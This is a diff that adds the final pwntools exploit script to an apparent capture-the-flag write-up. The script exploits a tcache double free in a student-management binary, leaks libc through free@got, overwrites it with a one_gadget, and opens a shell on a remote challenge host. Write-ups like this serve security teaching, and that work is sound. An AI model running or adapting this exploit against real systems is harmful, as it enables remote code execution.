@@ -69,3 +69,92 @@ With the libc base calculated and `input_buffer` still pointing to `free@got`, w
 
 * `Edit Student Name`: Write the address of `one_gadget`.
 * `Delete user`: Calls `free()`. Since the GOT is hijacked, this triggers the `one_gadget` and spawns a shell.
+
+## Exploit Script
+Here is the final solution:
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./vuln_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-2.27.so")
+
+context.binary = exe
+
+def conn():
+    if args.LOCAL:
+        r = process([exe.path])
+    else:
+        r = remote("34.40.105.109", 31466)
+    return r
+
+def main():
+    r = conn()
+
+    def send_choice(num):
+        r.sendafter(b'Choice: ', str(num).encode() + b'\n')
+
+    def makeNewUser(name=b'pwngod\x00', pad=True):
+        send_choice(2)
+        if pad and len(name) < 16:
+            name = name.ljust(16, b'\x00')
+        r.sendafter(b'name: ', name)
+
+    def editStudentName(payload):
+        send_choice(4)
+        if isinstance(payload, int):
+            payload = p64(payload)
+        r.sendafter(b'name: ', payload)
+
+    def printStudentName():
+        send_choice(5)
+        r.recvuntil(b"Students name is ")
+        return r.recvline().strip()
+
+    def deleteUser():
+        send_choice(7)
+
+    log.info("--- STARTING EXPLOIT ---")
+
+    makeNewUser()       
+    deleteUser()        
+    deleteUser()        
+
+    log.info(f"Targeting free@got: {hex(exe.got['free'])}")
+    editStudentName(exe.got['free'])
+
+    makeNewUser()       
+
+    log.info("Corrupting free@got LSB...")
+    makeNewUser(b'A', pad=False)
+
+    raw_leak = printStudentName()
+
+    leak_int = u64(raw_leak.ljust(8, b'\x00'))
+
+    log.info(f"Raw corrupted leak: {hex(leak_int)}")
+
+    fixed_addr = (leak_int & 0xFFFFFFFFFFFFFF00) | (libc.symbols['free'] & 0xFF)
+
+    log.info(f"Repaired free address: {hex(fixed_addr)}")
+
+    libc.address = fixed_addr - libc.symbols['free']
+    log.success(f"Libc Base: {hex(libc.address)}")
+
+    one_gadget = libc.address + 0x10a38c
+
+    log.info(f"Overwriting free -> One Gadget ({hex(one_gadget)})...")
+    editStudentName(p64(one_gadget))
+
+    log.info("Triggering Shell (calling free)...")
+    deleteUser()
+
+    r.interactive()
+
+if __name__ == "__main__":
+    main()
+    
+```
